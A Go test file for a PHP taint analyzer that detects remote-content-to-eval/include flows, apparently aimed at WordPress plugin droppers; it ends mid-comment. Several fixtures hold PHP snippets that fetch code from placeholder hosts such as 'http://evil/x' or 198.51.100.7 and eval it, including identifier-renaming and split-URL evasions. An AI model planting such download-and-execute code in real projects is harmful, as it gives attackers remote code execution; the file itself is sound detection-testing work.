package phptaint

import (
	"context"
	"encoding/base64"
	"fmt"
	"reflect"
	"slices"
	"strings"
	"sync/atomic"
	"testing"
)

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// Fixtures mirror the motivating sample and the two evasions that defeated
// the rejected regex approaches.
var (
	fxMotivating = b64(`<?php
function fetchContent($url) {
    $ch = curl_init($url);
    $data = curl_exec($ch);
    return $data;
}
$content = fetchContent('http://host/p.txt');
eval('?>' . $content);`)

	fxRenamed = b64(`<?php
function zqx($a) { $b = curl_init($a); $c = curl_exec($b); return $c; }
$q7 = zqx('http://host/p.txt');
eval('?>' . $q7);`)

	fxSplitURL = b64(`<?php
function grab($u) { return file_get_contents($u); }
$h = 'ho' . 'st';
$p = 'http://' . $h . '/payload';
$x = grab($p);
eval($x);`)

	// Each benign fixture below carries one unrelated, non-flowing call from
	// whichever keyword class (source/sink) its scenario otherwise lacks.
	// isCandidate requires both a source and a sink keyword present in the
	// byte stream before parsing runs at all (see TestPrefilterRejectsWithoutBothHalves
	// in prefilter_test.go); a fixture with only one half is StatusNotCandidate,
	// never reaching the deep analysis this test exercises.
	fxBenignLiteral = b64(`<?php
$cache = file_get_contents(__DIR__ . '/cache.json');
$code = 'return 1 + 1;';
eval($code);`)
	fxBenignEcho = b64(`<?php
function fetchContent($url) { return file_get_contents($url); }
$content = fetchContent('http://host/feed.xml');
echo htmlspecialchars($content);
include __DIR__ . '/parts/header.php';`)
	fxBenignInclude = b64(`<?php
$cache = file_get_contents('/etc/local-cache.txt');
$tpl = __DIR__ . '/parts/header.php';
include $tpl;`)
)

func run(t *testing.T, fixture string) Report {
	t.Helper()
	src, err := base64.StdEncoding.DecodeString(fixture)
	if err != nil {
		t.Fatalf("decode fixture: %v", err)
	}
	return Analyze(context.Background(), src)
}

func TestDetectsMotivatingSample(t *testing.T) {
	rep := run(t, fxMotivating)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("no flow reported for the motivating dropper")
	}
	if rep.Results[0].Sink != "eval" {
		t.Errorf("sink = %q, want eval", rep.Results[0].Sink)
	}
}

func TestDetectsRenamedIdentifiers(t *testing.T) {
	if len(run(t, fxRenamed).Results) == 0 {
		t.Fatal("renaming identifiers evaded detection")
	}
}

func TestDetectsSplitURL(t *testing.T) {
	if len(run(t, fxSplitURL).Results) == 0 {
		t.Fatal("splitting the URL across concatenation evaded detection")
	}
}

func TestBenignControlsReportNothing(t *testing.T) {
	for name, fx := range map[string]string{
		"literal": fxBenignLiteral,
		"echo":    fxBenignEcho,
		"include": fxBenignInclude,
	} {
		rep := run(t, fx)
		if rep.Status != StatusAnalyzed {
			t.Errorf("%s: status = %v (%s)", name, rep.Status, rep.Reason)
			continue
		}
		if len(rep.Results) != 0 {
			t.Errorf("%s: false positive: %+v", name, rep.Results)
		}
	}
}

// TestPropertyWriteDoesNotPoisonUnrelatedSink reproduces the false positive
// the corpus gate found in header-footer-elementor's
// class-bsf-analytics-loader.php: one property ($this->analytics_version)
// is written from remote content, and a DIFFERENT property
// ($this->analytics_path) -- never itself tainted -- reaches require_once
// in the same method. The write and the sink must be in one scope, or
// scope isolation alone would already hide the bug this test targets (see
// TestSinkInsideWrapperAtTopLevelIsDetected for that separate mechanism).
func TestPropertyWriteDoesNotPoisonUnrelatedSink(t *testing.T) {
	src := b64(`<?php
class Loader {
	private $analytics_version = '';
	private $analytics_path = '';
	function load($h) {
		$raw = curl_exec($h);
		$this->analytics_version = $raw;
		$this->analytics_path = 'safe/local/path.php';
		require_once $this->analytics_path;
	}
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: a write to $this->analytics_version poisoned a read of the unrelated $this->analytics_path: %+v", rep.Results)
	}
}

// TestPropertyWriteStillFlowsToItsOwnSink is the detection-preserving twin
// of the test above: when the SAME property that was written from remote
// content reaches a sink, that must still be reported.
func TestPropertyWriteStillFlowsToItsOwnSink(t *testing.T) {
	src := b64(`<?php
class Loader {
	private $code = '';
	function load($h) {
		$this->code = curl_exec($h);
		eval($this->code);
	}
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: a property flowing to its own sink was not detected")
	}
}

// TestAssertBooleanArgumentReportsNothing reproduces the second corpus-gate
// false positive, from SimplePie/src/File.php: assert() guarding a
// boolean condition over remotely-sourced content is not a code-execution
// sink on any PHP version this analyzer targets (see the boolean-argument
// sink exclusion covered in taint_test.go and facts_test.go).
func TestAssertBooleanArgumentReportsNothing(t *testing.T) {
	src := b64(`<?php
function fetchInfo($h) {
	$info = curl_exec($h);
	assert(is_array($info) && $info['redirect_count'] >= 0);
	return $info;
}
fetchInfo($handle);`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: boolean assert() argument reported as a sink: %+v", rep.Results)
	}
}

// TestAssertStringArgumentStillReportsFlow guards against the
// boolean-argument exclusion overcorrecting into never treating assert as
// a sink: a tainted variable passed directly is still a real PHP 7
// code-execution risk.
func TestAssertStringArgumentStillReportsFlow(t *testing.T) {
	src := b64(`<?php
function fetchCode($h) {
	$code = curl_exec($h);
	assert($code);
}
fetchCode($handle);`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: assert($taintedVar) was not detected")
	}
}

// TestArrayOnPropertyWriteDoesNotPoisonUnrelatedSink guards against
// assignedTargetKey unwrapping only property fetches: an array-dim fetch
// sitting OUTERMOST over a property fetch ($this->log[] = ...) must not
// fall through to the bare base-variable over-approximation, which would
// reintroduce a false positive across every other property on the object.
func TestArrayOnPropertyWriteDoesNotPoisonUnrelatedSink(t *testing.T) {
	src := b64(`<?php
class Loader {
	private $log = array();
	private $path = 'safe/local.php';
	function load($h) {
		$this->log[] = curl_exec($h);
		require_once $this->path;
	}
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: $this->log[] = ... poisoned an unrelated $this->path read: %+v", rep.Results)
	}
}

// TestArrayOnPropertyThroughGenericObjectDoesNotPoisonUnrelatedSink is the
// non-$this variant of the same case: a plain object variable, an
// array-appended property, and an unrelated property reaching a sink at
// the top level.
func TestArrayOnPropertyThroughGenericObjectDoesNotPoisonUnrelatedSink(t *testing.T) {
	src := b64(`<?php
$o->cache['x'] = curl_exec($h);
include $o->tpl;`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: $o->cache['x'] = ... poisoned an unrelated $o->tpl read: %+v", rep.Results)
	}
}

// TestArrayOnPropertyStillFlowsToItsOwnSink is the false-negative guard:
// reading the SAME property back through [] must still be detected, not
// just kept out of unrelated reads.
func TestArrayOnPropertyStillFlowsToItsOwnSink(t *testing.T) {
	src := b64(`<?php
class Loader {
	private $log = array();
	function load($h) {
		$this->log[] = curl_exec($h);
		eval($this->log[0]);
	}
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: $this->log[] flowing to eval($this->log[0]) was not detected")
	}
}

// TestUnresolvableAssignTargetSurfacesInReport covers a control case:
// ($a->b()->c = <tainted>; eval($a->b()->c); is NOT detected -- correctly,
// since a method-call-chain target is not keyed, and dropping is the safe
// direction) must still surface
// "unresolvable-assign-target" in Report.PrecisionLoss, because the dropped
// right-hand side (curl_exec($h)) is genuinely tainted -- the marker fires on
// that, not on the unkeyable target shape alone. Verified through the public
// Analyze entry point, not just in an internal scopeFacts structure.
func TestUnresolvableAssignTargetSurfacesInReport(t *testing.T) {
	src := []byte(`<?php
function f($h) {
	$a = new stdClass();
	$a->b()->c = curl_exec($h);
	eval($a->b()->c);
}
f($handle);`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none: a method-call-chain target is not keyed, so the flow is dropped (safe direction), not detected", rep.Results)
	}
	found := false
	for _, m := range rep.PrecisionLoss {
		if m == "unresolvable-assign-target" {
			found = true
		}
	}
	if !found {
		t.Errorf("PrecisionLoss = %v, want unresolvable-assign-target", rep.PrecisionLoss)
	}
}

func TestAliasedSourceDropSurfacesInReport(t *testing.T) {
	src := []byte(`<?php
use function curl_exec as fetch_remote;
Foo::$cache = fetch_remote($handle);
eval('safe literal');`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none for the safe sink", rep.Results)
	}
	if !slices.Contains(rep.PrecisionLoss, "unresolvable-assign-target") {
		t.Fatalf("PrecisionLoss = %v, want unresolvable-assign-target", rep.PrecisionLoss)
	}
}

func TestAliasedSourceDropInFunctionSurfacesInReport(t *testing.T) {
	src := []byte(`<?php
use function curl_exec as fetch_remote;
function cache_remote($handle) {
	Foo::$cache = fetch_remote($handle);
	eval('safe literal');
}`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none for the safe sink", rep.Results)
	}
	if !slices.Contains(rep.PrecisionLoss, "unresolvable-assign-target") {
		t.Fatalf("PrecisionLoss = %v, want unresolvable-assign-target", rep.PrecisionLoss)
	}
}

func TestAliasedSourceVariableDropInFunctionSurfacesInReport(t *testing.T) {
	src := []byte(`<?php
use function curl_exec as fetch_remote;
function cache_remote($handle) {
	$payload = fetch_remote($handle);
	Foo::$cache = $payload;
	eval('safe literal');
}`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none for the safe sink", rep.Results)
	}
	if !slices.Contains(rep.PrecisionLoss, "unresolvable-assign-target") {
		t.Fatalf("PrecisionLoss = %v, want unresolvable-assign-target", rep.PrecisionLoss)
	}
}

func TestAliasedSourceSummaryDropSurfacesInReport(t *testing.T) {
	src := []byte(`<?php
use function curl_exec as fetch_remote;
function fetch_code($handle) {
	return fetch_remote($handle);
}
Foo::$cache = fetch_code($handle);
eval('safe literal');`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none for the safe sink", rep.Results)
	}
	if !slices.Contains(rep.PrecisionLoss, "unresolvable-assign-target") {
		t.Fatalf("PrecisionLoss = %v, want unresolvable-assign-target", rep.PrecisionLoss)
	}
}

func TestAliasedSourceFlowsDirectlyToSink(t *testing.T) {
	src := []byte(`<?php
use function curl_exec as fetch_remote;
eval(fetch_remote($handle));`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 1 || rep.Results[0].Sink != "eval" {
		t.Fatalf("results = %+v, want one eval flow", rep.Results)
	}
}

func TestAliasedAssertInFunctionKeepsArgumentGate(t *testing.T) {
	tests := []struct {
		name        string
		argument    string
		wantResults int
	}{
		{name: "string-capable", argument: "$payload", wantResults: 1},
		{name: "boolean", argument: "$payload !== false", wantResults: 0},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			src := fmt.Sprintf(`<?php
use function assert as check;
function inspect_remote($handle) {
	$payload = curl_exec($handle);
	check(%s);
}`, tc.argument)
			rep := Analyze(context.Background(), []byte(src))
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if len(rep.Results) != tc.wantResults {
				t.Fatalf("results = %+v, want %d", rep.Results, tc.wantResults)
			}
		})
	}
}

// TestOrdinaryFileDoesNotReportUnresolvableAssignTarget is the noise guard,
// end to end: a file with only ordinary resolvable assignments (the
// existing motivating-sample fixture) must not carry the marker, or it
// would tell an operator nothing.
func TestOrdinaryFileDoesNotReportUnresolvableAssignTarget(t *testing.T) {
	rep := run(t, fxMotivating)
	for _, m := range rep.PrecisionLoss {
		if m == "unresolvable-assign-target" {
			t.Fatalf("PrecisionLoss = %v, want no unresolvable-assign-target for an ordinary file", rep.PrecisionLoss)
		}
	}
}

func TestFunctionLocalDoesNotTaintTopLevelSameName(t *testing.T) {
	// A function-local variable must not taint an unrelated top-level
	// variable that merely shares its name.
	src := b64(`<?php
function fetch($c) { $tmp = curl_exec($c); return $tmp; }
$tmp = 'safe literal';
eval($tmp);`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	for _, r := range rep.Results {
		if r.Sink == "eval" {
			t.Fatalf("false positive: clean top-level $tmp reported as %+v", r)
		}
	}
}

// TestConditionalFunctionDeclarationDoesNotLeak is the real WordPress
// idiom: guarding a function declaration with function_exists so a plugin
// can be included more than once. The declaration is not a direct
// top-level statement -- it is wrapped in an if -- so a filter keyed on
// the direct statement type at the top of a scope would miss it and let
// the inner $content taint the unrelated top-level $content.
func TestConditionalFunctionDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( ! function_exists( 'theme_fetch' ) ) {
	function theme_fetch( $url ) {
		$content = curl_exec( $url );
		return $content;
	}
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestConditionalClassDeclarationDoesNotLeak is the class_exists sibling of
// the function_exists guard: a class (and its method) declared inside an
// if must not leak the method's local into an identically-named top-level
// variable either.
func TestConditionalClassDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( ! class_exists( 'Theme_Fetcher' ) ) {
	class Theme_Fetcher {
		function fetch( $url ) {
			$content = curl_exec( $url );
			return $content;
		}
	}
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestTryWrappedDeclarationDoesNotLeak checks a different wrapper (try) to
// confirm the fix is not a special case for if: the library traverser
// recurses through every control-flow construct the same way, so the
// exclusion must be wrapper-agnostic.
func TestTryWrappedDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
try {
	function theme_fetch( $url ) {
		$content = curl_exec( $url );
		return $content;
	}
} catch ( Throwable $e ) {
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestDoublyWrappedDeclarationDoesNotLeak nests a declaration two wrappers
// deep. Exclusion is position-based, not keyed to any particular wrapper
// depth, so this must hold regardless of how many layers separate the
// declaration from the top level.
func TestDoublyWrappedDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( true ) {
	foreach ( array( 1 ) as $i ) {
		function theme_fetch( $url ) {
			$content = curl_exec( $url );
			return $content;
		}
	}
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestSinkInsideWrapperAtTopLevelIsDetected is the false-negative guard: a
// sink that genuinely belongs to the top-level scope, merely sitting
// inside an if, must still be detected. Excluding a declaration's own span
// must never over-narrow into excluding ordinary control flow that isn't a
// declaration at all.
func TestSinkInsideWrapperAtTopLevelIsDetected(t *testing.T) {
	src := b64(`<?php
$tainted = curl_exec($h);
if ($tainted) {
	eval($tainted);
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: sink genuinely at top level, wrapped in if, was not detected")
	}
}

// TestAnonymousClassMethodDoesNotLeak closes the same leak for an anonymous
// class assigned to a top-level variable. Its method is not a direct
// top-level statement either -- it is nested inside an ExprNew inside an
// assignment -- so this is covered by the same position-based exclusion as
// the named-declaration cases above, with no special case required.
func TestAnonymousClassMethodDoesNotLeak(t *testing.T) {
	src := b64(`<?php
$obj = new class {
	function get( $c ) {
		$tmp = curl_exec( $c );
		return $tmp;
	}
};
$tmp = 'safe literal';
eval( $tmp );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestClosureParameterShadowDoesNotLeak is the closure sibling of the
// function-parameter case: a closure parameter sharing the outer tainted
// variable's name must not inherit that taint, because the closure body is
// its own scope now, exactly like a named function's body already is.
func TestClosureParameterShadowDoesNotLeak(t *testing.T) {
	src := b64(`<?php
$data = file_get_contents('http://evil/x');
add_action('init', function ($data) { eval($data); });`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestClosureLocalReassignmentDoesNotLeak is the damaging false positive: no
// remote value reaches the sink at all. Without the closure's body being its
// own scope, the flow-insensitive fixpoint over one flat scope sees both the
// outer remote assignment and the closure's own local literal reassignment
// to the identically-named variable, and taints it regardless of order.
func TestClosureLocalReassignmentDoesNotLeak(t *testing.T) {
	src := b64(`<?php
$tpl = file_get_contents('http://evil/x');
register_shutdown_function(function () { $tpl = __DIR__ . '/local.php'; include $tpl; });`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestArrowFunctionParameterShadowDoesNotLeak is the arrow-function sibling
// of TestClosureParameterShadowDoesNotLeak. An arrow function's body is a
// single expression rather than a statement list, so this also exercises
// that the exclusion and per-scope analysis mechanism handles that shape.
func TestArrowFunctionParameterShadowDoesNotLeak(t *testing.T) {
	src := b64(`<?php
$code = file_get_contents('https://evil/x');
$f = fn($code) => eval($code);`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestClosureFlowStillDetected is the false-negative guard for
// TestClosureParameterShadowDoesNotLeak and TestClosureLocalReassignmentDoesNotLeak:
// a genuine fetch-to-sink flow entirely inside a closure body must still be
// found once that body is analysed as its own scope, the same way a flow
// entirely inside a named function's body already is.
func TestClosureFlowStillDetected(t *testing.T) {
	src := b64(`<?php
add_action('init', function ($u) { $c = curl_exec($u); eval($c); });`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: genuine flow inside a closure was not detected")
	}
}

// TestArrowFunctionFlowStillDetected is the arrow-function sibling of
// TestClosureFlowStillDetected: a genuine flow entirely inside an arrow
// function's single-expression body must still be found.
func TestArrowFunctionFlowStillDetected(t *testing.T) {
	src := b64(`<?php
$f = fn($u) => eval(curl_exec($u));`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: genuine flow inside an arrow function was not detected")
	}
}

// TestClosureInsideFunctionInsideWrapperDoesNotLeak composes the closure
// exclusion with the existing wrapper and function exclusions: a closure
// nested inside a function, itself nested inside a control-flow wrapper,
// must not let its own local leak into the identically-named local of the
// function that declares it.
func TestClosureInsideFunctionInsideWrapperDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( true ) {
	function outer( $h ) {
		$tmp = 'safe literal';
		register_shutdown_function( function () use ( $h ) {
			$tmp = curl_exec( $h );
		} );
		eval( $tmp );
	}
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// manyDeclSource builds n trivial class declarations followed by one
// genuine curl_exec-to-eval flow, so a test can tell "this analyzed
// correctly at scale" apart from "this merely returned quickly because
// nothing was found."
func manyDeclSource(n int) []byte {
	var src strings.Builder
	src.WriteString("<?php\n")
	for i := 0; i < n; i++ {
		fmt.Fprintf(&src, "class decl%d{}\n", i)
	}
	src.WriteString("$d = curl_exec($h);\neval($d);\n")
	return []byte(src.String())
}

func summaryLimitSource() []byte {
	var src strings.Builder
	src.WriteString("<?php\n")
	for i := 0; i < maxSummarizedFuncs; i++ {
		fmt.Fprintf(&src, "function summary%d(){}\n", i)
	}
	src.WriteString("function over_limit($h){return curl_exec($h);}\n")
	src.WriteString("$d = over_limit($h); eval($d);\n")
	return []byte(src.String())
}

type cancelOnErrCheck struct {
	context.Context
	cancel    context.CancelFunc
	remaining atomic.Int32
}

func newCancelOnErrCheck(check int32) *cancelOnErrCheck {
	ctx, cancel := context.WithCancel(context.Background())
	out := &cancelOnErrCheck{Context: ctx, cancel: cancel}
	out.remaining.Store(check)
	return out
}

func (c *cancelOnErrCheck) Err() error {
	if c.remaining.Add(-1) == 0 {
		c.cancel()
	}
	return c.Context.Err()
}

// TestManyDeclarationsStillAnalyzeCorrectly is a correctness check at
// scale, not a performance guard: the genuine flow appended after 15,000
// declarations must still be found, which only happens if every
// declaration's own exclusion index was built correctly. (An earlier
// version of this test tried to double as a performance regression guard
// by relying on go test's default timeout as an implicit backstop. That
// was not reliable -- see TestDeclarationTreeBuildCountIsIndependentOfDeclarationCount's
// comment for why -- so this test now only asserts what it can actually
// guarantee.)
func TestManyDeclarationsStillAnalyzeCorrectly(t *testing.T) {
	rep := Analyze(context.Background(), manyDeclSource(15_000))
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("genuine flow after 15,000 declarations was not detected")
	}
}

// TestDeclarationTreeBuildCountIsIndependentOfDeclarationCount asserts the
// structural performance invariant directly. analyze and functionSummaries
// share one scopeFacts, so its declaration tree must be built exactly once
// regardless of declaration count. The counter observes builds without
// making the assertion depend on machine speed or CI load.
func TestDeclarationTreeBuildCountIsIndependentOfDeclarationCount(t *testing.T) {
	buildsFor := func(n int) int64 {
		before := declTreeBuilds.Load()
		rep := Analyze(context.Background(), manyDeclSource(n))
		if rep.Status != StatusAnalyzed {
			t.Fatalf("status = %v (%s) for %d declarations", rep.Status, rep.Reason, n)
		}
		return declTreeBuilds.Load() - before
	}

	small := buildsFor(1_000)
	large := buildsFor(10_000)

	if small != 1 || large != 1 {
		t.Fatalf("build count = %d at 1,000 declarations and %d at 10,000, want exactly one per analysis", small, large)
	}
}

func TestSummaryLimitReportsCoverageGap(t *testing.T) {
	rep := Analyze(context.Background(), summaryLimitSource())
	if rep.Status != StatusResourceLimit {
		t.Fatalf("status = %v, want StatusResourceLimit past %d summaries", rep.Status, maxSummarizedFuncs)
	}
	if len(rep.Results) != 0 {
		t.Errorf("results = %+v, want none for a coverage-gap status", rep.Results)
	}
}

func TestAnalyzeChecksContextAfterDeclarationIndex(t *testing.T) {
	ctx := newCancelOnErrCheck(4)
	t.Cleanup(ctx.cancel)

	rep := Analyze(ctx, manyDeclSource(1_000))
	if rep.Status != StatusCanceled {
		t.Fatalf("status = %v, want StatusCanceled", rep.Status)
	}
	if len(rep.Results) != 0 {
		t.Errorf("results = %+v, want none for a canceled analysis", rep.Results)
	}
}

func TestAnalyzeReportsPreboundedEvidenceTruncation(t *testing.T) {
	t.Run("source label", func(t *testing.T) {
		name := strings.Repeat("fetch", maxSegmentBytes)
		src := fmt.Sprintf("<?php function %s(){return curl_exec($h);} eval(%s());", name, name)
		rep := Analyze(context.Background(), []byte(src))
		if rep.Status != StatusAnalyzed {
			t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
		}
		if len(rep.Results) != 1 {
			t.Fatalf("results = %+v, want one flow", rep.Results)
		}
		if !rep.EvidenceTruncated {
			t.Fatal("EvidenceTruncated = false for a shortened source label")
		}
		if len(rep.Results[0].Source) > maxSegmentBytes {
			t.Fatalf("source length = %d, want at most %d", len(rep.Results[0].Source), maxSegmentBytes)
		}
	})

	t.Run("identifiers", func(t *testing.T) {
		// Identifiers lists every name in the sink expression, not just the
		// ones that carried taint -- these $cleanN variables never carry
		// $tainted's value, but they still count toward the truncation cap.
		var src strings.Builder
		src.WriteString("<?php $tainted = curl_exec($h); eval($tainted")
		for i := 0; i < maxChainSegments; i++ {
			fmt.Fprintf(&src, " . $clean%d", i)
		}
		src.WriteString(");")

		rep := Analyze(context.Background(), []byte(src.String()))
		if rep.Status != StatusAnalyzed {
			t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
		}
		if len(rep.Results) != 1 {
			t.Fatalf("results = %+v, want one flow", rep.Results)
		}
		if !rep.EvidenceTruncated {
			t.Fatal("EvidenceTruncated = false for a shortened identifiers list")
		}
		if len(rep.Results[0].Identifiers) != maxChainSegments {
			t.Fatalf("identifiers length = %d, want %d", len(rep.Results[0].Identifiers), maxChainSegments)
		}
	})
}

// TestDeclarationLimitReportsCoverageGap confirms the defence-in-depth cap
// fires as a coverage gap, never a silent skip: a file whose declaration
// count exceeds maxDeclarations must report StatusResourceLimit -- meaning
// the file was NOT examined -- rather than StatusAnalyzed with an
// incomplete (and therefore falsely "clean") result.
func TestDeclarationLimitReportsCoverageGap(t *testing.T) {
	src := manyDeclSource(maxDeclarations + 1)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusResourceLimit {
		t.Fatalf("status = %v, want StatusResourceLimit for %d declarations", rep.Status, maxDeclarations+1)
	}
	if len(rep.Results) != 0 {
		t.Errorf("results = %+v, want none for a coverage-gap status", rep.Results)
	}
}

func TestResultsAreDeterministic(t *testing.T) {
	first := run(t, fxMotivating)
	for i := 0; i < 5; i++ {
		again := run(t, fxMotivating)
		if len(again.Results) != len(first.Results) {
			t.Fatalf("run %d: result count changed", i)
		}
		for j := range first.Results {
			// Result.Identifiers is a []string, so Result is not comparable with !=;
			// reflect.DeepEqual preserves the same byte-identical intent.
			if !reflect.DeepEqual(again.Results[j], first.Results[j]) {
				t.Fatalf("run %d result %d differs", i, j)
			}
		}
	}
}

var (
	fxCaptureTainted = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
add_action('init', function() use ($payload) { eval($payload); });`)

	fxCaptureTaintedArrow = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
add_action('init', fn() => eval($payload));`)

	// The local include is a sink that no tainted value reaches. Without a
	// sink the pre-filter rejects the file outright and the analyzed path
	// this test is about never runs.
	fxCaptureClean = b64(`<?php
$payload = 'local literal';
$unused = curl_exec($c);
include __DIR__ . '/parts/header.php';
add_action('init', function() use ($payload) { echo $payload; });`)

	fxCaptureParamShadow = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
add_action('init', function($payload) { include $payload; });`)

	fxCaptureThenReassign = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
add_action('init', function() use ($payload) { $payload = 'safe.php'; include $payload; });`)
)

// TestClosureCaptureOfTaintedValueIsRecorded pins the package's own contract:
// scoping a closure's body keeps an unrelated same-named outer variable from
// firing on clean code, but it also means a value the closure genuinely does
// receive through use() stops being tracked at the boundary. That is a real
// reduction in coverage, and this package treats an unrecorded reduction as a
// silent false negative rather than an acceptable trade.
func TestClosureCaptureOfTaintedValueIsRecorded(t *testing.T) {
	for _, tc := range []struct{ name, fixture string }{
		{"use clause", fxCaptureTainted},
		{"arrow function", fxCaptureTaintedArrow},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := run(t, tc.fixture)
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if !slices.Contains(rep.PrecisionLoss, "closure-capture") {
				t.Fatalf("precision loss = %v, want it to record closure-capture", rep.PrecisionLoss)
			}
		})
	}
}

// TestClosureCaptureOfCleanValueIsNotRecorded is the gate that keeps the
// marker worth reading. Capturing is ordinary PHP -- a use() clause or an
// arrow function appears in 14.6% of the files this analyzer looks at -- so a
// marker raised on the shape alone would fire on roughly one analyzed file in
// seven and tell an operator nothing. It is raised only when the captured
// value was actually tainted, i.e. only when taint really was dropped.
